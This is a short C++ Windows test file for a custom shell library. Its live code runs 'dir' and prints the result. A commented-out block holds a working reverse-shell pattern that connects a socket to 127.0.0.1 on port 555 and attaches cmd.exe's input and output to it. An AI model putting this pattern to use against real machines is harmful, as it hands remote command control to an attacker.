/*#include <winsock2.h>
#include <ws2tcpip.h>
*/
#include "shell.hxx"

#pragma comment(lib,"Ws2_32.lib")

int main()
{
    /*WSADATA wsa;
    SOCKET fd;
    shell::Shell s;
    struct sockaddr_in client;

    WSAStartup(MAKEWORD(2,2),&wsa);

    fd = WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);

    client.sin_addr.s_addr = inet_addr("127.0.0.1");
    client.sin_port = htons(555);
    client.sin_family = AF_INET;

    if (WSAConnect(fd,(struct sockaddr *)&client,sizeof(client),0,0,0,0) != SOCKET_ERROR)
    {
        s.SpawnShellCustomStd("cmd.exe",(HANDLE)fd,(HANDLE)fd,(HANDLE)fd);
    }*/

    shell::Shell s;
    //std::string out = s.ExecutePowerShellCommand("ls",4096);
    //std::cout << out << std::endl;
    shell::ShellStdio mystruct;
    mystruct.size = 4096;
    s.ExecShellCommand("dir",&mystruct);
    std::cout << mystruct.output << std::endl;

    return (0);
}